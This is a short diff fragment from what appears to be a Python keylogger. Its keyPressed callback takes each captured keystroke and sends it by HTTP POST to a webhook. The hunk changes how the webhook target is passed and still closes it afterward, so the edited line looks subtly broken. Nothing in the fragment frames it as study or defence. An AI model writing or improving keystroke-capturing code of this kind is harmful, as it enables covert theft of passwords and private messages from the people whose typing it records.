@@ -7,7 +7,7 @@ def keyPressed(key):
     message = {
         "content": str(key)
     }
-    requests.post(webhook.read(), message)
+    requests.post(webhook, message)
     webhook.close()
 
 if __name__ == "__main__":
